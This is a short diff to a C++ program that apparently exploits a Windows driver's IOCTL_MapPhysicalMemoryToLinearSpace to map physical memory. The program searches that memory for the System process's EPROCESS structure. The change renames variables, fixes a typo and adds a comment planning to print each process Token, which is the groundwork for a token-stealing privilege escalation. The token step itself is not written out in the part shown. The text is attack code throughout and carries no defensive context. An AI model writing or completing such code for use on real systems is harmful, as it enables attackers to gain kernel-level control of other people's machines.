@@ -51,18 +51,21 @@ int main(int argc, char** argv)
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
 
-	std::vector <unsigned __int64> locations;
+	std::vector <unsigned __int64> EPROCESS_SYSTEM;
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
-	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, locations) == -1)
+	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
-	size_t locaitonSize = locations.size();
-	for (int i = 0; i < locaitonSize; i++) {
-		printf("\n------------------------------------\nEPROCESS Base of System: %p\n", (void*)locations[i]);
+	size_t EPROCESS_SYSTEM_size = EPROCESS_SYSTEM.size();
+	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+		printf("------------------------------------\nEPROCESS Base of System: %p\n", (void*)EPROCESS_SYSTEM[i]);
 	}
+
+	// print Token for each EPROCESS Base
+
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
 	CloseHandle(device);
 	return EXIT_SUCCESS;
